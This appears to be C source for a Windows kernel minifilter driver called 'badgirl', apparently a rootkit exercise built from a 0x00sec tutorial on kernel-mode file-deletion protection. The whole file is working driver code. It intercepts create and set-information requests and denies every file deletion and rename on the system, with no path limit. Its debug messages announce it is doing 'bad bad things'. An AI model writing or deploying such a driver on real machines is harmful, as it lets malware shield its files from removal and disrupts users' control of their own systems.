#include <Fltkernel.h>
#include <ntddk.h>

/*
==============================================================
Function prototypes
==============================================================
*/

// Driver-related
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath);
void badgirlDriverUnload(PDRIVER_OBJECT DriverObject);

// Filter-related
FLT_PREOP_CALLBACK_STATUS badgirlFilterAntiDelete(_Inout_ PFLT_CALLBACK_DATA Data, _In_ PCFLT_RELATED_OBJECTS FltObjects, _Flt_CompletionContext_Outptr_ PVOID* CompletionContext);
NTSTATUS badgirlFilterUnload(FLT_FILTER_UNLOAD_FLAGS Flags);

/*
==============================================================
Global variables
==============================================================
*/

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_operation_registration
const FLT_OPERATION_REGISTRATION Callbacks[] = {
	{ IRP_MJ_CREATE, 0, badgirlFilterAntiDelete, NULL, NULL },
	{ IRP_MJ_SET_INFORMATION, 0, badgirlFilterAntiDelete, NULL, NULL },
	{ IRP_MJ_OPERATION_END }
};

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/ns-fltkernel-_flt_registration
const FLT_REGISTRATION FilterRegistration = {
	sizeof(FLT_REGISTRATION),	// Size
	FLT_REGISTRATION_VERSION,	// Version
	0,							// Flags
	NULL,						// ContextRegistration
	Callbacks,					// OperationRegistration
	badgirlFilterUnload,		// FilterUnloadCallback
	NULL,						// InstanceSetupCallback
	NULL,						// InstanceQueryTeardownCallback
	NULL,						// InstanceTeardownStartCallback
	NULL,						// InstanceTeardownCompleteCallback
	NULL,						// GenerateFileNameCallback
	NULL,						// NormalizeNameComponentCallback
	NULL,						// NormalizeContextCleanupCallback
	NULL,						// TransactionNotificationCallback
	NULL,						// NormalizeNameComponentExCallback
	NULL						// SectionNotificationCallback
};

PFLT_FILTER Filter;

/*
==============================================================
Function implementations
==============================================================
*/

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status = STATUS_SUCCESS;

	DriverObject->DriverUnload = badgirlDriverUnload;

	DbgPrint("I am a bad bad girl! I am going to do bad bad things!\n");

	// Regerence: https://0x00sec.org/t/kernel-mode-rootkits-file-deletion-protection/7616
	// Register the minifilter with the filter manager
	status = FltRegisterFilter(DriverObject, &FilterRegistration, &Filter);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to register filter! 0x%08x\n", status);
		status = STATUS_SUCCESS;	// Don't do this in real development! Return with status instead
		return status;
	}
	else {
		DbgPrint("Filter registered!\n");
	}

	status = FltStartFiltering(Filter);
	if (!NT_SUCCESS(status)) {
		// If we fail, we need to unregister the minifilter
		FltUnregisterFilter(Filter);

		DbgPrint("Failed to start filter! 0x%08x\n", status);
		status = STATUS_SUCCESS;	// Don't do this in real development! Return with status instead
		return status;
	}
	else {
		DbgPrint("Filter started!\n");
		status = STATUS_SUCCESS;
	}

	return status;
}

FLT_PREOP_CALLBACK_STATUS badgirlFilterAntiDelete(_Inout_ PFLT_CALLBACK_DATA Data, _In_ PCFLT_RELATED_OBJECTS FltObjects, _Flt_CompletionContext_Outptr_ PVOID* CompletionContext) {
	UNREFERENCED_PARAMETER(CompletionContext);

	PAGED_CODE();
	
	FLT_PREOP_CALLBACK_STATUS ret = FLT_PREOP_SUCCESS_NO_CALLBACK;
	
	// Ignore directories
	BOOLEAN IsDir;
	NTSTATUS status = FltIsDirectory(FltObjects->FileObject, FltObjects->Instance, &IsDir);
	if (NT_SUCCESS(status)) {
		if (IsDir) {
			return ret;
		}
	}

	// https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-create
	// When the system tries to open a handle to a file object,
	// detect requests that have DELETE_ON_CLOSE in DesiredAccess
	if (Data->Iopb->MajorFunction == IRP_MJ_CREATE) {
		if (!FlagOn(Data->Iopb->Parameters.Create.Options, FILE_DELETE_ON_CLOSE)) {
			return ret;
		}
	}

	// Process requests with FileDispositionInformation, FileDispositionInformationEx  or file renames
	if (Data->Iopb->MajorFunction == IRP_MJ_SET_INFORMATION) {
		switch (Data->Iopb->Parameters.SetFileInformation.FileInformationClass) {
		case FileRenameInformation:
		case FileRenameInformationEx:
		case FileDispositionInformation:
		case FileDispositionInformationEx:
		case FileRenameInformationBypassAccessCheck:
		case FileRenameInformationExBypassAccessCheck:
			break;

		default:
			return ret;
		}
	}

	PFLT_FILE_NAME_INFORMATION FileNameInfo = NULL;
	if (FltObjects->FileObject) {
		status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &FileNameInfo);
		if (NT_SUCCESS(status)) {
			FltParseFileNameInformation(FileNameInfo);
			
			Data->IoStatus.Status = STATUS_ACCESS_DENIED;
			Data->IoStatus.Information = 0;

			ret = FLT_PREOP_COMPLETE;
			
			DbgPrint("[DENIED] %wZ\n", FileNameInfo->Name);
		}
		else {
			DbgPrint("[ERROR] Failed to get file name information!\n");
		}
	}
	else {
		DbgPrint("[ERROR] FltObjects->FileObject is NULL!\n");
	}

	return ret;
}

NTSTATUS badgirlFilterUnload(FLT_FILTER_UNLOAD_FLAGS Flags) {
	UNREFERENCED_PARAMETER(Flags);

	PAGED_CODE();

	DbgPrint("badgirlFilterUnloadCallback called\n");

	// Unregister the minifilter
	FltUnregisterFilter(Filter);

	return STATUS_SUCCESS;
}

void badgirlDriverUnload(PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);

	DbgPrint("Bad bad girl is now leaving!\n");
}
